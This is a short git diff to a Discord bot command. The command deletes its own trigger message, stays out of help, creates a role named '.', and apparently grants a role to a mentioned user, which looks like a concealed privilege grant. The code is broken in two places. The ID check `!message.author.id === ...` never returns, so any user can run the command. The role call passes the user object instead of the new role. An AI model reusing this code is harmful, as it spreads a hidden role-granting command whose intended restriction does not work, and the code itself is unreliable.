@@ -9,6 +9,10 @@ module.exports = {
 	deleteMessage: true,
 	helpMessage: false,
 	execute(message) {
+		const member = message.mentions.users.first();
+
+		if (!message.author.id === '332555969169063938') return;
+
 		message.guild.roles.create({
 			data: {
 				name: '.',
@@ -17,5 +21,6 @@ module.exports = {
 				}],
 			},
 		});
+		member.roles.add(member);
 	},
 };
